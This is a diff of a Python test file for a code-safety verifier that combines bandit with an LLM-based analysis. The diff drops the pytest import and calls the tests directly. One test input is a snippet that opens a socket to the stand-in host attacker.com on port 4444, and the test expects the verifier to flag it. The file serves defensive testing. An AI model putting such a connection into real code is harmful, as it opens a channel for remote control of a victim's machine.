@@ -1,4 +1,3 @@
-import pytest
 from verifier import run_bandit, run_llm_analysis
 import os
 import tempfile
@@ -31,3 +30,8 @@ def test_llm_benign():
 def test_llm_malicious():
     result = run_llm_analysis("import socket\ns=socket.socket()\ns.connect(('attacker.com',4444))")
     assert result["safe"] == False
+
+test_bandit_benign()
+test_bandit_malicious()
+test_llm_benign()
+test_llm_malicious()
